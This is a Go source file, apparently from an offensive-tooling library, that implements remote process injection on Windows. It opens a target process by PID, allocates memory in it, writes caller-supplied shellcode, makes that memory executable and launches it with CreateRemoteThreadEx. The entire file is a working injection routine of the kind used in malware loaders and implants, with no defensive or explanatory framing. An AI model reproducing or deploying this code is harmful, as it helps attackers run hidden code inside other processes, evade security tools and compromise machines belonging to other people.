package shellcode

import (
	"errors"
	"unsafe"
	"golang.org/x/sys/windows"
)

func CreateRemoteThread(shellcode []byte, pid int) error {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")

	GetCurrentProcess := kernel32.NewProc("GetCurrentProcess")
	OpenProcess := kernel32.NewProc("OpenProcess")
	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	CreateRemoteThreadEx := kernel32.NewProc("CreateRemoteThreadEx")
	CloseHandle := kernel32.NewProc("CloseHandle")

	var pHandle uintptr

	if pid == 0 {
		pHandle, _, _ = GetCurrentProcess.Call()
	} else {
		pHandle, _, _ = OpenProcess.Call(
			windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION,
			uintptr(0),
			uintptr(pid),
		)
	}

	addr, _, _ := VirtualAllocEx.Call(
		uintptr(pHandle),
		0,
		uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)

	if addr == 0 {
		return errors.New("VirtualAllocEx failed and returned 0")
	}

	WriteProcessMemory.Call(
		uintptr(pHandle),
		addr,
		(uintptr)(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
	)

	oldProtect := windows.PAGE_READWRITE
	VirtualProtectEx.Call(
		uintptr(pHandle),
		addr,
		uintptr(len(shellcode)),
		windows.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	CreateRemoteThreadEx.Call(
		uintptr(pHandle),
		0,
		0,
		addr,
		0,
		0,
		0,
	)

	_, _, errCloseHandle := CloseHandle.Call(pHandle)
	if errCloseHandle != nil {
		return errCloseHandle
	}

	return nil
}


